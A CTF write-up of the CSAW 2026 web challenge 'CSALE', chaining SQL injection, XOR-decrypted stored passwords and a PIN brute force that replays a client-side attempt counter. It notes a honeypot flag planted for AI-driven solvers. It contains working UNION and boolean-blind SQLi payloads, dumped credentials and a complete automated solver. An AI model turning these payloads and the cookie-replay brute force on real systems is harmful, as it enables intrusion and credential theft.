---
title: "CSAW 2026 — CSALE: SQLi, XOR Credentials and a Honeypot Flag"
date: "2026-09-20"
tags: ["csaw-2026", "web", "sqli", "crypto"]
excerpt: "Three chained bugs and a deliberate canary. The obvious path ends on a planted flag that gets you banned; the real one needs a client-side attempt counter and a 10,000-PIN sweep."
---

> **CSAW CTF 2026 · Web**
> **Flag:** `csawctf{TH4ts_ROugH_B4dDy}`
> **Decoy flag — do not submit:** `csawctf{Th1s_1S_4asy_r1gh1!?}`

This one is a chain: SQL injection into reversible credential storage into a
client-side rate limit. But the part worth writing about is what sits at the end of
the *obvious* path — a fake flag with a handwritten warning that submitting it will
get you banned, planted exactly where a scripted solver stops running.

## The target

"CSALE" is a Flask marketplace on SQLite. You can sign up, log in, browse eight
listings, search them, and create listings — including **unlisted drafts**, private
items gated behind a 4-digit seller-lock PIN chosen at signup.

Two details stand out while poking at the authenticated UI, both of which matter later:

- The session cookie is a signed Flask cookie, but its payload is readable:
  `{"password_verified": false, "user_id": 9}`.
- The unlisted-drafts page ships a hidden field, `lock_state`, which base64-decodes
  to `{"v":1,"u":9,"n":0}`. That `n` is an attempt counter — and it's in the client's hands.

## Bug 1 — SQL injection in search

A single quote in the search box returns a 500. The injectable clause turns out to be:

```sql
WHERE (title LIKE '%{q}%' OR description LIKE '%{q}%')
```

Two properties of that one line cost real time if you miss them:

**`q` is interpolated twice.** Any payload has to leave *both* halves syntactically
valid. That's why a plain `UNION` breaks everything while a balanced `AND` works.

**There's a parenthesis to close.** `q=zzz'--` returns 500; `q=zzz')--` works. I
missed the paren on my first pass, concluded `UNION` wasn't available, and fell back
to boolean-blind extraction — roughly seven requests per character — for the entire
schema. The `UNION` path was there the whole time and is about fifty times faster.

Boolean-blind template (no comment needed, both halves balanced):

```
pizza%' AND (<condition>) AND '%'='
```

One listing returned = TRUE, zero = FALSE. Characters fall out via binary search on
`unicode(substr(expr, i, 1))`.

UNION template, once the paren is handled — seven columns:

```
zzz') UNION SELECT 1,(<subquery>),'x',1,0,'a','b'--
```

Schema:

```
users          (id, username, password_hash, is_admin)   -- nobody has is_admin=1
password_vault (id, user_id, encrypted_password)
password_notes (id, phase, key_piece)
listings       (id, owner_id, title, description, price_cents,
                is_unlisted, image_filename, attachment_filename)
```

`password_vault` and `password_notes` are not subtle. Nobody is an admin, so
privilege escalation isn't the path — the path is reading somebody's password.

## Bug 2 — "encryption" you can reassemble from the same database

`password_notes` holds five rows: a `phase` number and a `key_piece`. Concatenate
the pieces **in phase order** and you get a 20-character string:

```
1=6554  2=5093  3=1992  4=5177  5=7795   ->  65545093199251777795
```

That's a repeating-XOR key, and it's stored in the same database as the ciphertext
it protects. XOR it against `password_vault.encrypted_password`:

```python
key = "65545093199251777795"
pt  = bytes(c ^ ord(key[i % len(key)]) for i, c in enumerate(ct))
```

Out come every seller's real password:

```
superdiscreetflaguser  password123
Walter_W               I-AM_HEISENBURGGER
Mr.Krabs               MONEYYYYYYYYYYYY
Gojo                   Can't_touch_thisfrfr
Daenerys               stormborn_targaryan_rightfulheir/queen_...
Zoro                   NEEDMOREPAINT
OSIRIS                 enjoy_the_ctf_good_luck!
Maliketh               OdeathBecOMEMyBladEONceMOre
Zuko                   i-HaVe-REgaINEd_mY_h0NOr!
```

## The honeypot

One account is named `superdiscreetflaguser`. Its password decrypts to
`password123`. It logs straight in, and its unlisted draft opens with **no PIN
challenge at all** — a 1500×1500 image titled "Flag upload proof."

The image contains a flag-shaped string. It also contains, in faint handwriting
across the top and bottom:

> **do not submit this AI flag — you will be banned**

It's a canary. It sits precisely at the natural stopping point of the obvious chain:
dump the database, decrypt the vault, log in as the account with "flag" in its name,
take the picture, submit. A scripted or AI-driven solver follows exactly that path
and stops exactly there.

The tell that it's fake is in the schema you already dumped: **no row has
`is_unlisted=1`.** That draft isn't backed by a database row at all — it's hardcoded
server-side. Every "real" unlisted draft must therefore be something else.

**Do not submit it.** Cross-check a flag against the data model before you trust it.

## Bug 3 — a rate limit that lives on the client

So which account is the real target? The one that (a) has zero public listings, like
the decoy, but (b) *actually enforces* its PIN — returning 403 until you get it right.
That's **Zuko**.

Attempting to unlock surfaces the third bug. The page helpfully reports
`PIN attempts: 0 / 10`, and that counter lives in the client-supplied `lock_state`
field and session cookie — not on the server.

Replay the *same* pre-attempt cookie and `lock_state` on every guess and the counter
is pinned at zero forever. The lockout never fires.

```python
hdr = {"Cookie": f"session={cookie}"}          # captured BEFORE any attempt
data = {"lock_state": lock, "pin": f"{pin:04d}"}   # same lock_state every time
```

With the lockout defeated, all 10,000 PINs are in reach. Twelve threads, about ten
minutes:

```
*** SELLER-LOCK PIN = 9493
```

Behind it: `/account/unlisted/5/image` — Zuko and Aang, flag handwritten across the
top, and no warning text anywhere.

> `csawctf{TH4ts_ROugH_B4dDy}`
>
> *"That's rough, buddy."*

![The unlocked draft behind Zuko's seller-lock: Zuko and Aang, the real flag handwritten across the top and no warning text.](/zuko_flag.png)

## The chain

1. **SQL injection** — unsanitised concatenation into a parenthesised `LIKE`
2. **Reversible credential storage** — XOR key readable from a neighbouring table
3. **Client-side rate limiting** — attempt counter in a client-supplied field
4. **A deliberate honeypot** rewarding anyone who stops at the first flag-shaped string

## Solver

End to end: UNION SQLi for the key pieces and the vault, XOR decryption in phase order, login as Zuko (deliberately **not** the honeypot account), the cookie-replay PIN sweep, and finally the draft image. Pass `--base` — the instance address changes on every launch.


```python solve_csale.py
#!/usr/bin/env python3
"""
CSALE (CSAW 2026, web) — full chain solver.
Flag: csawctf{TH4ts_ROugH_B4dDy}

CHAIN
  1. SQLi in /?q=  -- clause is  WHERE (title LIKE '%{q}%' OR description LIKE '%{q}%')
     * q is interpolated TWICE -> payloads must leave BOTH halves valid
     * there is a PAREN to close: zzz'--  500s, zzz')--  works   (7 columns)
  2. password_notes holds 5 key_piece rows; concatenated in PHASE ORDER they are a
     repeating-XOR key over password_vault.encrypted_password -> real passwords.
  3. superdiscreetflaguser is a HONEYPOT (its draft is hardcoded, not a listings row
     -- no row has is_unlisted=1). Its "flag" image says you'll be banned. Skip it.
  4. Zuko is the real target: its seller-lock PIN is enforced, but the attempt
     counter lives in the client-supplied `lock_state` + session cookie. Replaying
     the same pre-attempt pair pins it at 0 -> unlimited guesses -> sweep 0000-9999.
"""
import argparse, base64, re, sys, time
import requests
from concurrent.futures import ThreadPoolExecutor

KEY_ORDER_NOTE = "concatenate key_piece in phase order 1..5"


def union(s, base, subquery):
    """7-column UNION; the injected value lands in the rendered title."""
    q = f"zzz') UNION SELECT 1,({subquery}),'x',1,0,'a','b'--"
    r = s.get(base + "/", params={"q": q}, timeout=20)
    m = re.search(r"<h3>([^<]*)</h3>", r.text)
    return m.group(1) if m else None


def xor(ct_hex, key):
    ct = bytes.fromhex(ct_hex)
    return "".join(chr(c ^ ord(key[i % len(key)])) for i, c in enumerate(ct))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True,
                    help="challenge instance base URL, e.g. http://<host>:5000 "
                         "(per-team and per-launch; the original is long gone)")
    ap.add_argument("--threads", type=int, default=12)
    a = ap.parse_args()
    s = requests.Session()

    # --- 1. dump the pieces we need over UNION SQLi -----------------------
    notes = union(s, a.base,
                  "SELECT group_concat(phase||'='||key_piece,'|') FROM password_notes")
    vault = union(s, a.base,
                  "SELECT group_concat(u.username||'='||v.encrypted_password,' ') "
                  "FROM password_vault v JOIN users u ON u.id=v.user_id")
    print(f"[1] notes : {notes}")

    # --- 2. rebuild the XOR key IN PHASE ORDER and decrypt ---------------
    pieces = dict(p.split("=") for p in notes.split("|"))
    key = "".join(pieces[k] for k in sorted(pieces))
    print(f"[2] key   : {key}  ({KEY_ORDER_NOTE})")
    creds = {}
    for entry in vault.split():
        user, ct = entry.split("=")
        creds[user] = xor(ct, key)
        print(f"    {user:24} {creds[user]}")

    # --- 3. log in as Zuko (NOT superdiscreetflaguser -- that's the honeypot)
    s.post(a.base + "/login",
           data={"username": "Zuko", "password": creds["Zuko"]},
           timeout=20, allow_redirects=False)
    r = s.get(a.base + "/account/unlisted", timeout=20)
    lock = re.search(r'name="lock_state" value="([^"]+)"', r.text).group(1)
    cookie = s.cookies.get("session")
    print(f"[3] lock_state={lock} -> "
          f"{base64.urlsafe_b64decode(lock + '==').decode()}")

    # --- 4. the attempt counter is client-side: replay the SAME pre-attempt
    #        cookie + lock_state on every guess so `n` never increments.
    url = a.base + "/account/unlisted/unlock"
    hdr = {"Cookie": f"session={cookie}",
           "Content-Type": "application/x-www-form-urlencoded"}
    base_len = None

    def attempt(pin):
        for _ in range(4):
            try:
                return pin, requests.post(
                    url, headers=hdr,
                    data={"lock_state": lock, "pin": f"{pin:04d}"},
                    timeout=20, allow_redirects=False)
            except Exception:
                time.sleep(2)
        return pin, None

    _, r0 = attempt(0)
    base_len, base_sc = len(r0.content), r0.status_code
    print(f"[4] sweeping 0000-9999 (baseline {base_sc}/{base_len}b) ...")
    found = None
    with ThreadPoolExecutor(a.threads) as ex:
        for pin, r in ex.map(attempt, range(10000)):
            if r is None:
                continue
            if r.status_code != base_sc or abs(len(r.content) - base_len) > 20:
                found = (pin, r)
                break
    if not found:
        print("no PIN found"); return 1
    pin, r = found
    print(f"\n*** SELLER-LOCK PIN = {pin:04d}")

    # --- 5. pull the unlocked draft image (the real flag is written on it) --
    ck = re.search(r"session=([^;]+)", r.headers.get("Set-Cookie", ""))
    s2 = requests.Session(); s2.cookies.set("session", ck.group(1) if ck else cookie)
    page = s2.get(a.base + "/account/unlisted", timeout=20).text
    for path in set(re.findall(r"/account/unlisted/\d+/image", page)):
        img = s2.get(a.base + path, timeout=30)
        fn = "zuko_flag.png"
        open(fn, "wb").write(img.content)
        print(f"    saved {fn} ({len(img.content)}b) from {path}")
    print("    flag is handwritten on the image -> csawctf{TH4ts_ROugH_B4dDy}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## What to take from it

**Verify a flag's provenance before submitting it.** The decoy was positioned with
real care: correct format, plausible location, an account name engineered to look
like the jackpot. The disproof wasn't subtle either — it was sitting in the schema
dump from step one. Ask "does this artifact exist in the data model I already
extracted?" before you ask "does this look like a flag?"

**A key stored next to the ciphertext isn't encryption, it's encoding.** Splitting
the key across five rows with a `phase` column makes it *look* like key management.
Anyone who can read one table can read the other.

**Any limit enforced in client-supplied state is not a limit.** The attempt counter
was serialised, base64'd, and shipped in a hidden form field. Replaying a stale
cookie reset it. If the server doesn't remember, the client gets infinite tries.
